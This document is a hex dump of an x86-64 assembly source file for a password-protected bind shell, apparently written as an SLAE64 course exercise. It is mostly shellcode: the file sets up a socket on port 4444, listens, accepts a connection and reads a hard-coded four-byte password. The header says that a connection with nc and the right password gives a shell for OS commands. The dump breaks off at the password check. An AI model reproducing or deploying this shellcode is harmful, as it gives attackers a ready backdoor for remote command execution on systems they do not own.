00000000  3b 20 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |; ==============|
00000010  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000040  3d 3d 3d 3d 3d 0a 3b 20  50 61 73 73 77 6f 72 64  |=====.; Password|
00000050  20 50 72 6f 74 65 63 74  65 64 20 42 69 6e 64 20  | Protected Bind |
00000060  53 68 65 6c 6c 0a 3b 20  41 75 74 68 6f 72 3a 20  |Shell.; Author: |
00000070  53 4c 41 45 36 34 2d 31  33 35 31 20 28 4b 65 79  |SLAE64-1351 (Key|
00000080  6d 61 6e 29 0a 3b 20 44  61 74 65 3a 20 30 33 2f  |man).; Date: 03/|
00000090  30 39 2f 32 30 31 34 0a  3b 0a 3b 20 53 68 65 6c  |09/2014.;.; Shel|
000000a0  6c 63 6f 64 65 20 6c 65  6e 67 74 68 3a 20 20 31  |lcode length:  1|
000000b0  34 37 20 62 79 74 65 73  0a 3b 0a 3b 20 44 65 73  |47 bytes.;.; Des|
000000c0  63 72 69 70 74 69 6f 6e  3a 0a 3b 0a 3b 20 20 20  |cription:.;.;   |
000000d0  20 53 69 6d 70 6c 65 20  62 69 6e 64 20 73 68 65  | Simple bind she|
000000e0  6c 6c 20 28 6c 69 73 74  65 6e 73 20 6f 6e 20 70  |ll (listens on p|
000000f0  6f 72 74 20 34 34 34 34  20 62 79 20 64 65 66 61  |ort 4444 by defa|
00000100  75 6c 74 29 20 77 69 74  68 20 34 20 62 79 74 65  |ult) with 4 byte|
00000110  73 0a 3b 20 20 20 20 70  61 73 73 77 6f 72 64 20  |s.;    password |
00000120  70 72 6f 74 65 63 74 69  6f 6e 2e 20 55 73 69 6e  |protection. Usin|
00000130  67 20 61 20 34 20 62 79  74 65 73 20 6c 6f 6e 67  |g a 4 bytes long|
00000140  20 70 61 73 73 77 6f 72  64 20 69 73 20 73 74 69  | password is sti|
00000150  6c 6c 0a 3b 20 20 20 20  72 65 61 73 6f 6e 61 62  |ll.;    reasonab|
00000160  6c 79 20 73 74 72 6f 6e  67 20 66 6f 72 20 61 20  |ly strong for a |
00000170  73 69 6e 67 6c 65 2d 73  68 6f 74 20 63 6f 6e 6e  |single-shot conn|
00000180  65 63 74 69 6f 6e 20 61  6e 64 20 6b 65 65 70 73  |ection and keeps|
00000190  20 74 68 65 0a 3b 20 20  20 20 63 6f 64 65 20 73  | the.;    code s|
000001a0  68 6f 72 74 65 72 2e 0a  3b 0a 3b 20 20 20 20 54  |horter..;.;    T|
000001b0  6f 20 63 68 61 6e 67 65  20 74 68 65 20 70 6f 72  |o change the por|
000001c0  74 20 6f 72 20 74 68 65  20 70 61 73 73 77 6f 72  |t or the passwor|
000001d0  64 20 6a 75 73 74 20 6d  6f 64 69 66 79 20 74 68  |d just modify th|
000001e0  65 20 76 61 6c 75 65 73  20 6f 66 20 74 68 65 0a  |e values of the.|
000001f0  3b 20 20 20 20 65 78 70  5f 70 6f 72 74 20 61 6e  |;    exp_port an|
00000200  64 20 65 78 70 5f 70 61  73 73 20 22 76 61 72 69  |d exp_pass "vari|
00000210  61 62 6c 65 73 22 20 62  65 6c 6f 77 2e 0a 3b 0a  |ables" below..;.|
00000220  3b 20 20 20 20 41 66 74  65 72 20 74 68 65 20 63  |;    After the c|
00000230  6f 64 65 20 67 65 74 73  20 65 78 65 63 75 74 65  |ode gets execute|
00000240  64 20 63 6f 6e 6e 65 63  74 20 74 6f 20 74 68 65  |d connect to the|
00000250  20 6e 65 77 6c 79 20 6f  70 65 6e 65 64 20 70 6f  | newly opened po|
00000260  72 74 3a 0a 3b 20 20 20  0a 3b 20 20 20 20 6e 63  |rt:.;   .;    nc|
00000270  20 3c 49 50 20 61 64 64  72 65 73 73 3e 20 3c 70  | <IP address> <p|
00000280  6f 72 74 20 6e 75 6d 62  65 72 3e 0a 3b 0a 3b 20  |ort number>.;.; |
00000290  20 20 20 54 68 65 72 65  20 69 73 20 6e 6f 20 70  |   There is no p|
000002a0  61 73 73 77 6f 72 64 20  70 72 6f 6d 70 74 2e 20  |assword prompt. |
000002b0  54 79 70 65 20 69 6e 20  74 68 65 20 34 20 62 79  |Type in the 4 by|
000002c0  74 65 73 20 6c 6f 6e 67  20 70 61 73 73 77 6f 72  |tes long passwor|
000002d0  64 0a 3b 20 20 20 20 61  6e 64 20 68 69 74 20 65  |d.;    and hit e|
000002e0  6e 74 65 72 2e 20 49 66  20 74 68 65 20 70 61 73  |nter. If the pas|
000002f0  73 77 6f 72 64 20 6d 61  74 63 68 65 73 2c 20 79  |sword matches, y|
00000300  6f 75 20 61 72 65 20 72  65 61 64 79 20 74 6f 20  |ou are ready to |
00000310  74 79 70 65 0a 3b 20 20  20 20 4f 53 20 63 6f 6d  |type.;    OS com|
00000320  6d 61 6e 64 73 2e 0a 3b  0a 3b 20 3d 3d 3d 3d 3d  |mands..;.; =====|
00000330  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000360  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 0a 20  |==============. |
00000370  0a 67 6c 6f 62 61 6c 20  5f 73 74 61 72 74 0a 73  |.global _start.s|
00000380  65 63 74 69 6f 6e 20 2e  74 65 78 74 0a 20 0a 3b  |ection .text. .;|
00000390  20 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ---------------|
000003a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003d0  2d 2d 2d 2d 0a 3b 20 50  72 65 70 72 6f 63 65 73  |----.; Preproces|
000003e0  73 6f 72 20 64 69 72 65  63 74 69 76 65 73 20 73  |sor directives s|
000003f0  6f 20 79 6f 75 20 63 61  6e 20 65 61 73 69 6c 79  |o you can easily|
00000400  20 63 68 61 6e 67 65 20  74 68 65 20 70 6f 72 74  | change the port|
00000410  20 61 6e 64 20 74 68 65  0a 3b 20 70 61 73 73 77  | and the.; passw|
00000420  6f 72 64 2e 0a 3b 20 2d  2d 2d 2d 2d 2d 2d 2d 2d  |ord..; ---------|
00000430  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000460  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 0a 20 0a 3b 20 50  |----------. .; P|
00000470  6f 72 74 20 6e 75 6d 62  65 72 20 74 6f 20 6c 69  |ort number to li|
00000480  73 74 65 6e 20 6f 6e 2e  0a 25 64 65 66 69 6e 65  |sten on..%define|
00000490  20 65 78 70 5f 70 6f 72  74 20 20 20 20 20 20 20  | exp_port       |
000004a0  20 30 78 35 63 31 31 20  20 20 20 20 20 20 20 20  | 0x5c11         |
000004b0  20 3b 20 34 34 34 34 0a  20 0a 3b 20 50 61 73 73  | ; 4444. .; Pass|
000004c0  77 6f 72 64 20 74 6f 20  75 73 65 2e 0a 25 64 65  |word to use..%de|
000004d0  66 69 6e 65 20 65 78 70  5f 70 61 73 73 20 20 20  |fine exp_pass   |
000004e0  20 20 20 20 20 30 78 36  63 36 63 36 35 36 38 20  |     0x6c6c6568 |
000004f0  20 20 20 20 20 3b 20 68  65 6c 6c 0a 20 0a 3b 20  |     ; hell. .; |
00000500  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000540  2d 2d 2d 0a 3b 20 44 4f  20 4e 4f 54 20 54 4f 55  |---.; DO NOT TOU|
00000550  43 48 0a 3b 20 70 72 65  70 72 6f 63 65 73 73 6f  |CH.; preprocesso|
00000560  72 20 64 69 72 65 63 74  69 76 65 73 20 73 6f 20  |r directives so |
00000570  73 79 73 63 61 6c 6c 73  20 63 61 6e 20 62 65 20  |syscalls can be |
00000580  65 61 73 69 6c 79 20 72  65 66 65 72 65 6e 63 65  |easily reference|
00000590  64 0a 3b 20 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |d.; ------------|
000005a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000005d0  2d 2d 2d 2d 2d 2d 2d 0a  20 0a 25 64 65 66 69 6e  |-------. .%defin|
000005e0  65 20 73 79 73 5f 62 69  6e 64 20 20 20 20 34 39  |e sys_bind    49|
000005f0  0a 25 64 65 66 69 6e 65  20 73 79 73 5f 6c 69 73  |.%define sys_lis|
00000600  74 65 6e 20 20 35 30 0a  25 64 65 66 69 6e 65 20  |ten  50.%define |
00000610  73 79 73 5f 61 63 63 65  70 74 20 20 34 33 0a 25  |sys_accept  43.%|
00000620  64 65 66 69 6e 65 20 73  79 73 5f 65 78 65 63 76  |define sys_execv|
00000630  65 20 20 35 39 0a 25 64  65 66 69 6e 65 20 73 79  |e  59.%define sy|
00000640  73 5f 64 75 70 32 20 20  20 20 33 33 0a 20 0a 5f  |s_dup2    33. ._|
00000650  73 74 61 72 74 3a 0a 20  0a 20 20 20 20 3b 20 2d  |start:. .    ; -|
00000660  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000690  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0a 20  |--------------. |
000006a0  20 20 20 3b 20 53 54 41  52 54 3a 20 63 72 65 61  |   ; START: crea|
000006b0  74 65 20 73 6f 63 6b 65  74 0a 20 20 20 20 3b 20  |te socket.    ; |
000006c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000006f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 0a  |---------------.|
00000700  20 20 20 20 20 20 78 6f  72 20 72 61 78 2c 20 72  |      xor rax, r|
00000710  61 78 0a 20 20 20 20 20  20 70 75 73 68 20 72 61  |ax.      push ra|
00000720  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |x              ;|
00000730  20 73 61 76 69 6e 67 20  66 6f 72 20 73 6f 63 6b  | saving for sock|
00000740  61 64 64 72 0a 20 20 20  20 20 20 70 75 73 68 20  |addr.      push |
00000750  72 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |rax             |
00000760  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 73  |             ; s|
00000770  74 72 75 63 74 0a 20 20  20 20 20 20 70 75 73 68  |truct.      push|
00000780  20 72 61 78 20 20 20 20  20 20 20 20 20 20 20 20  | rax            |
00000790  20 20 3b 20 63 6c 65 61  72 20 72 61 78 20 6c 61  |  ; clear rax la|
000007a0  74 65 72 0a 20 20 20 20  20 20 70 75 73 68 20 72  |ter.      push r|
000007b0  61 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |ax              |
000007c0  3b 20 73 65 74 20 72 64  78 20 74 6f 20 30 0a 20  |; set rdx to 0. |
000007d0  20 20 20 20 20 70 6f 70  20 72 64 78 20 20 20 20  |     pop rdx    |
000007e0  20 20 20 20 20 20 20 20  20 20 20 3b 20 70 72 6f  |           ; pro|
000007f0  74 6f 63 6f 6c 0a 20 20  20 20 20 20 6d 6f 76 20  |tocol.      mov |
00000800  61 6c 2c 20 32 0a 20 20  20 20 20 20 70 75 73 68  |al, 2.      push|
00000810  20 72 61 78 0a 20 20 20  20 20 20 70 75 73 68 20  | rax.      push |
00000820  72 61 78 0a 20 20 20 20  20 20 70 6f 70 20 72 73  |rax.      pop rs|
00000830  69 0a 20 20 20 20 20 20  70 6f 70 20 72 64 69 20  |i.      pop rdi |
00000840  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000850  50 46 5f 49 4e 45 54 0a  20 20 20 20 20 20 73 68  |PF_INET.      sh|
00000860  72 20 72 73 69 2c 20 31  20 20 20 20 20 20 20 20  |r rsi, 1        |
00000870  20 20 20 20 3b 20 53 4f  43 4b 5f 53 54 52 45 41  |    ; SOCK_STREA|
00000880  4d 0a 20 20 20 20 20 20  61 64 64 20 61 6c 2c 20  |M.      add al, |
00000890  33 39 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |39            ; |
000008a0  73 6f 63 6b 65 74 20 73  79 73 63 61 6c 6c 20 28  |socket syscall (|
000008b0  34 31 29 0a 20 20 20 20  20 20 73 79 73 63 61 6c  |41).      syscal|
000008c0  6c 0a 20 0a 20 20 20 20  3b 20 2d 2d 2d 2d 2d 2d  |l. .    ; ------|
000008d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000900  2d 2d 2d 2d 2d 2d 2d 2d  2d 0a 20 0a 20 20 20 20  |---------. .    |
00000910  20 20 70 75 73 68 20 72  61 78 20 20 20 20 20 20  |  push rax      |
00000920  20 20 20 20 20 20 20 20  3b 20 73 74 6f 72 65 20  |        ; store |
00000930  73 6f 63 6b 66 64 20 61  73 20 66 69 72 73 74 0a  |sockfd as first.|
00000940  20 20 20 20 20 20 70 6f  70 20 72 64 69 20 20 20  |      pop rdi   |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 61 72  |            ; ar|
00000960  67 75 6d 65 6e 74 20 6f  66 20 62 69 6e 64 0a 20  |gument of bind. |
00000970  0a 20 20 20 20 3b 20 2d  2d 2d 2d 2d 2d 2d 2d 2d  |.    ; ---------|
00000980  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000009b0  2d 2d 2d 2d 2d 2d 0a 20  20 20 20 3b 20 53 54 41  |------.    ; STA|
000009c0  52 54 3a 20 63 72 65 61  74 65 20 73 74 72 75 63  |RT: create struc|
000009d0  74 0a 20 20 20 20 3b 0a  20 20 20 20 3b 20 73 72  |t.    ;.    ; sr|
000009e0  76 5f 61 64 64 72 2e 73  69 6e 5f 66 61 6d 69 6c  |v_addr.sin_famil|
000009f0  79 20 3d 20 41 46 5f 49  4e 45 54 3b 0a 20 20 20  |y = AF_INET;.   |
00000a00  20 3b 20 73 72 76 5f 61  64 64 72 2e 73 69 6e 5f  | ; srv_addr.sin_|
00000a10  61 64 64 72 2e 73 5f 61  64 64 72 20 3d 20 49 4e  |addr.s_addr = IN|
00000a20  41 44 44 52 5f 41 4e 59  3b 0a 20 20 20 20 3b 20  |ADDR_ANY;.    ; |
00000a30  73 72 76 5f 61 64 64 72  2e 73 69 6e 5f 70 6f 72  |srv_addr.sin_por|
00000a40  74 20 3d 20 68 74 6f 6e  73 28 70 6f 72 74 6e 6f  |t = htons(portno|
00000a50  29 3b 0a 20 20 20 20 3b  0a 20 20 20 20 3b 20 54  |);.    ;.    ; T|
00000a60  68 69 73 20 69 73 20 68  6f 77 20 69 74 20 6c 6f  |his is how it lo|
00000a70  6f 6b 73 20 6c 69 6b 65  20 6f 6e 20 74 68 65 20  |oks like on the |
00000a80  73 74 61 63 6b 20 28 70  6f 72 74 20 69 73 20 34  |stack (port is 4|
00000a90  34 34 34 29 3a 0a 20 20  20 20 3b 0a 20 20 20 20  |444):.    ;.    |
00000aa0  3b 20 30 78 30 32 20 20  20 30 78 30 30 20 20 20  |; 0x02   0x00   |
00000ab0  30 78 31 31 20 20 20 30  78 35 63 20 20 20 30 78  |0x11   0x5c   0x|
00000ac0  30 30 20 20 20 30 78 30  30 20 20 20 30 78 30 30  |00   0x00   0x00|
00000ad0  20 20 20 30 78 30 30 0a  20 20 20 20 3b 20 30 78  |   0x00.    ; 0x|
00000ae0  30 30 20 20 20 30 78 30  30 20 20 20 30 78 30 30  |00   0x00   0x00|
00000af0  20 20 20 30 78 30 30 20  20 20 30 78 30 30 20 20  |   0x00   0x00  |
00000b00  20 30 78 30 30 20 20 20  30 78 30 30 20 20 20 30  | 0x00   0x00   0|
00000b10  78 30 30 0a 20 20 20 20  3b 20 2d 2d 2d 2d 2d 2d  |x00.    ; ------|
00000b20  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000b50  2d 2d 2d 2d 2d 2d 2d 2d  2d 0a 20 20 20 20 20 20  |---------.      |
00000b60  70 6f 70 20 72 61 78 20  20 20 20 20 20 20 20 20  |pop rax         |
00000b70  20 20 20 20 20 20 3b 20  63 6c 65 61 72 20 72 61  |      ; clear ra|
00000b80  78 20 73 6f 20 63 61 6e  20 62 65 0a 20 20 20 20  |x so can be.    |
00000b90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000bb0  20 20 20 20 3b 20 75 73  65 64 20 66 6f 72 20 73  |    ; used for s|
00000bc0  79 73 63 61 6c 6c 20 4e  72 2e 0a 20 20 20 20 20  |yscall Nr..     |
00000bd0  20 6d 6f 76 20 62 79 74  65 20 5b 72 73 70 5d 2c  | mov byte [rsp],|
00000be0  20 32 20 20 20 20 20 20  20 20 20 3b 20 73 65 74  | 2         ; set|
00000bf0  20 76 61 6c 75 65 73 0a  20 20 20 20 20 20 6d 6f  | values.      mo|
00000c00  76 20 77 6f 72 64 20 5b  72 73 70 2b 32 5d 2c 20  |v word [rsp+2], |
00000c10  65 78 70 5f 70 6f 72 74  0a 20 20 20 20 20 20 70  |exp_port.      p|
00000c20  75 73 68 20 72 73 70 0a  20 20 20 20 20 20 70 6f  |ush rsp.      po|
00000c30  70 20 72 73 69 20 20 20  20 20 20 20 20 20 20 20  |p rsi           |
00000c40  20 20 20 20 3b 20 61 64  64 72 20 6f 66 20 73 74  |    ; addr of st|
00000c50  72 75 63 74 20 69 6e 20  72 73 69 0a 20 0a 20 20  |ruct in rsi. .  |
00000c60  20 20 3b 20 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |  ; ------------|
00000c70  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000ca0  2d 2d 2d 0a 20 20 20 20  3b 20 62 69 6e 64 20 73  |---.    ; bind s|
00000cb0  6f 63 6b 65 74 0a 20 20  20 20 3b 20 2d 2d 2d 2d  |ocket.    ; ----|
00000cc0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000cf0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 0a 20 0a 20 20  |-----------. .  |
00000d00  20 20 20 20 70 75 73 68  20 72 61 78 0a 20 20 20  |    push rax.   |
00000d10  20 20 20 70 6f 70 20 72  64 78 0a 20 20 20 20 20  |   pop rdx.     |
00000d20  20 61 64 64 20 64 6c 2c  20 31 36 20 20 20 20 20  | add dl, 16     |
00000d30  20 20 20 20 20 20 20 3b  20 73 6f 63 6b 6c 65 6e  |       ; socklen|
00000d40  5f 74 20 61 64 64 72 6c  65 6e 0a 20 20 20 20 20  |_t addrlen.     |
00000d50  20 61 64 64 20 61 6c 2c  20 73 79 73 5f 62 69 6e  | add al, sys_bin|
00000d60  64 20 20 20 20 20 20 20  20 20 20 3b 20 73 79 73  |d          ; sys|
00000d70  63 61 6c 6c 20 6e 75 6d  62 65 72 0a 20 20 20 20  |call number.    |
00000d80  20 20 73 79 73 63 61 6c  6c 0a 20 0a 20 20 20 20  |  syscall. .    |
00000d90  3b 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |; --------------|
00000da0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000dd0  2d 0a 20 20 20 20 3b 20  6c 69 73 74 65 6e 0a 20  |-.    ; listen. |
00000de0  20 20 20 3b 20 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |   ; -----------|
00000df0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000e20  2d 2d 2d 2d 0a 20 0a 20  20 20 20 3b 20 72 64 69  |----. .    ; rdi|
00000e30  20 73 68 6f 75 6c 64 20  73 74 69 6c 6c 20 68 6f  | should still ho|
00000e40  6c 64 20 74 68 65 20 73  6f 63 6b 65 74 20 64 65  |ld the socket de|
00000e50  73 63 72 69 70 74 6f 72  20 73 6f 20 77 65 20 64  |scriptor so we d|
00000e60  6f 6e 27 74 0a 20 20 20  20 3b 20 68 61 76 65 20  |on't.    ; have |
00000e70  74 6f 20 73 65 74 20 69  74 20 61 67 61 69 6e 0a  |to set it again.|
00000e80  20 0a 20 20 20 20 20 20  3b 20 57 65 20 63 61 6e  | .      ; We can|
00000e90  20 73 61 76 65 20 61 20  27 78 6f 72 20 72 61 78  | save a 'xor rax|
00000ea0  2c 20 72 61 78 27 20 68  65 72 65 2e 0a 20 20 20  |, rax' here..   |
00000eb0  20 20 20 3b 20 49 66 20  73 75 63 63 65 73 73 2c  |   ; If success,|
00000ec0  20 30 20 69 73 20 72 65  74 75 72 6e 65 64 20 62  | 0 is returned b|
00000ed0  79 20 62 69 6e 64 2c 20  77 65 20 77 69 6c 6c 20  |y bind, we will |
00000ee0  68 61 76 65 20 74 68 65  20 72 61 78 20 72 65 67  |have the rax reg|
00000ef0  2e 0a 20 20 20 20 20 20  3b 20 63 6c 65 61 72 65  |..      ; cleare|
00000f00  64 2e 0a 20 0a 20 20 20  20 20 20 70 75 73 68 20  |d.. .      push |
00000f10  32 0a 20 20 20 20 20 20  70 6f 70 20 72 73 69 0a  |2.      pop rsi.|
00000f20  20 20 20 20 20 20 61 64  64 20 61 6c 2c 20 73 79  |      add al, sy|
00000f30  73 5f 6c 69 73 74 65 6e  0a 20 20 20 20 20 20 73  |s_listen.      s|
00000f40  79 73 63 61 6c 6c 0a 20  0a 20 20 20 20 3b 20 2d  |yscall. .    ; -|
00000f50  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000f80  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0a 20  |--------------. |
00000f90  20 20 20 3b 20 61 63 63  65 70 74 0a 20 20 20 20  |   ; accept.    |
00000fa0  3b 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |; --------------|
00000fb0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000fe0  2d 0a 20 0a 20 20 20 20  3b 20 72 64 69 20 73 68  |-. .    ; rdi sh|
00000ff0  6f 75 6c 64 20 73 74 69  6c 6c 20 68 6f 6c 64 20  |ould still hold |
00001000  74 68 65 20 73 6f 63 6b  65 74 20 64 65 73 63 72  |the socket descr|
00001010  69 70 74 6f 72 20 73 6f  20 77 65 20 64 6f 6e 27  |iptor so we don'|
00001020  74 0a 20 20 20 20 3b 20  68 61 76 65 20 74 6f 20  |t.    ; have to |
00001030  73 65 74 20 69 74 20 61  67 61 69 6e 0a 20 0a 20  |set it again. . |
00001040  20 20 20 20 20 3b 20 57  65 20 63 61 6e 20 73 61  |     ; We can sa|
00001050  76 65 20 61 20 27 78 6f  72 20 72 61 78 2c 20 72  |ve a 'xor rax, r|
00001060  61 78 27 20 68 65 72 65  2e 0a 20 20 20 20 20 20  |ax' here..      |
00001070  3b 20 49 66 20 73 75 63  63 65 73 73 2c 20 30 20  |; If success, 0 |
00001080  69 73 20 72 65 74 75 72  6e 65 64 20 62 79 20 6c  |is returned by l|
00001090  69 73 74 65 6e 2c 20 77  65 20 77 69 6c 6c 20 68  |isten, we will h|
000010a0  61 76 65 20 74 68 65 20  72 61 78 20 72 65 67 2e  |ave the rax reg.|
000010b0  0a 20 20 20 20 20 20 3b  20 63 6c 65 61 72 65 64  |.      ; cleared|
000010c0  2e 0a 20 0a 20 20 20 20  20 20 70 75 73 68 20 72  |.. .      push r|
000010d0  61 78 0a 20 20 20 20 20  20 70 6f 70 20 72 64 78  |ax.      pop rdx|
000010e0  0a 20 20 20 20 20 20 70  75 73 68 20 72 61 78 0a  |.      push rax.|
000010f0  20 20 20 20 20 20 70 6f  70 20 72 73 69 0a 20 20  |      pop rsi.  |
00001100  20 20 20 20 61 64 64 20  61 6c 2c 20 73 79 73 5f  |    add al, sys_|
00001110  61 63 63 65 70 74 0a 20  20 20 20 20 20 73 79 73  |accept.      sys|
00001120  63 61 6c 6c 0a 20 0a 20  20 20 20 3b 20 61 74 20  |call. .    ; at |
00001130  74 68 69 73 20 70 6f 69  6e 74 20 72 61 78 20 63  |this point rax c|
00001140  6f 6e 74 61 69 6e 73 20  74 68 65 20 6e 65 77 20  |ontains the new |
00001150  73 6f 63 6b 65 74 20 64  65 73 63 72 69 70 74 6f  |socket descripto|
00001160  72 0a 20 0a 20 20 20 20  20 20 70 75 73 68 20 72  |r. .      push r|
00001170  61 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |ax              |
00001180  3b 20 73 61 76 65 20 6e  65 77 20 73 6f 63 6b 66  |; save new sockf|
00001190  64 0a 20 20 20 20 20 20  70 75 73 68 20 72 61 78  |d.      push rax|
000011a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 0a  |              ;.|
000011b0  20 20 20 20 20 20 70 6f  70 20 72 64 69 20 20 20  |      pop rdi   |
000011c0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 66 69  |            ; fi|
000011d0  72 73 74 20 61 72 67 75  6d 65 6e 74 20 66 6f 72  |rst argument for|
000011e0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000011f0  20 20 20 20 20 3b 20 72  65 61 64 28 29 0a 20 20  |     ; read().  |
00001200  20 20 20 20 70 6f 70 20  72 31 35 20 20 20 20 20  |    pop r15     |
00001210  20 20 20 20 20 20 20 20  20 20 3b 20 73 61 76 65  |          ; save|
00001220  20 66 6f 72 20 6c 61 74  65 72 0a 20 0a 20 20 20  | for later. .   |
00001230  20 3b 20 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ; -------------|
00001240  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001270  2d 2d 0a 20 20 20 20 3b  20 67 65 74 20 70 61 73  |--.    ; get pas|
00001280  73 77 64 0a 20 20 20 20  3b 0a 20 20 20 20 3b 20  |swd.    ;.    ; |
00001290  57 65 20 77 69 6c 6c 20  77 6f 72 6b 20 77 69 74  |We will work wit|
000012a0  68 20 61 20 34 20 62 79  74 65 20 70 61 73 73 77  |h a 4 byte passw|
000012b0  6f 72 64 2c 20 73 68 6f  75 6c 64 20 62 65 20 6d  |ord, should be m|
000012c0  6f 72 65 20 74 68 61 6e  0a 20 20 20 20 3b 20 65  |ore than.    ; e|
000012d0  6e 6f 75 67 68 20 61 73  20 6e 6f 20 62 72 75 74  |nough as no brut|
000012e0  65 20 66 6f 72 63 69 6e  67 20 69 73 20 70 6f 73  |e forcing is pos|
000012f0  73 69 62 6c 65 2e 20 43  68 61 6e 63 65 73 20 74  |sible. Chances t|
00001300  6f 20 67 75 65 73 73 0a  20 20 20 20 3b 20 74 68  |o guess.    ; th|
00001310  65 20 72 69 67 68 74 20  76 61 6c 75 65 20 69 73  |e right value is|
00001320  20 30 2e 20 20 4f 66 20  63 6f 75 72 73 65 20 70  | 0.  Of course p|
00001330  61 73 73 77 64 20 73 68  6f 75 6c 64 20 6e 6f 74  |asswd should not|
00001340  20 63 6f 6e 74 61 69 6e  0a 20 20 20 20 3b 20 6e  | contain.    ; n|
00001350  75 6c 6c 20 62 79 74 65  73 2e 0a 20 20 20 20 3b  |ull bytes..    ;|
00001360  0a 20 20 20 20 3b 20 6e  20 3d 20 72 65 61 64 28  |.    ; n = read(|
00001370  6e 65 77 73 6f 63 6b 66  64 2c 62 75 66 66 65 72  |newsockfd,buffer|
00001380  2c 34 29 3b 0a 20 20 20  20 3b 20 2d 2d 2d 2d 2d  |,4);.    ; -----|
00001390  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000013c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 0a 20 0a 20 20 20  |----------. .   |
000013d0  20 20 20 78 6f 72 20 72  61 78 2c 20 72 61 78 20  |   xor rax, rax |
000013e0  20 20 20 20 20 20 20 20  20 3b 20 72 65 61 64 28  |         ; read(|
000013f0  29 20 69 73 20 73 79 73  63 61 6c 6c 20 4e 72 2e  |) is syscall Nr.|
00001400  20 30 0a 20 20 20 20 20  20 70 75 73 68 20 72 61  | 0.      push ra|
00001410  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |x              ;|
00001420  20 62 75 66 66 65 72 20  66 69 6c 6c 65 64 20 77  | buffer filled w|
00001430  69 74 68 20 30 73 0a 20  20 20 20 20 20 70 75 73  |ith 0s.      pus|
00001440  68 20 72 73 70 20 20 20  20 20 20 20 20 20 20 20  |h rsp           |
00001450  20 20 20 3b 20 73 65 74  75 70 20 70 6f 69 6e 74  |   ; setup point|
00001460  65 72 20 74 6f 20 62 75  66 0a 20 20 20 20 20 20  |er to buf.      |
00001470  70 6f 70 20 72 73 69 0a  20 20 20 20 20 20 61 64  |pop rsi.      ad|
00001480  64 20 72 64 78 2c 20 34  0a 20 20 20 20 20 20 73  |d rdx, 4.      s|
00001490  79 73 63 61 6c 6c 0a 20  0a 20 20 20 20 20 20 3b  |yscall. .      ;|
000014a0  20 63 6f 6d 70 61 72 65  20 70 61 73 73 20 72 65  | compare pass re|
000014b0  63 65 69 76 65 64 20 77  69 74 68 20 76 61 6c 69  |ceived with vali|
000014c0  64 20 70 61 73 73 20 61  6e 64 20 65 78 69 74 20  |d pass and exit |
000014d0  69 66 20 6e 6f 20 6d 61  74 63 68 0a 20 0a 20 20  |if no match. .  |
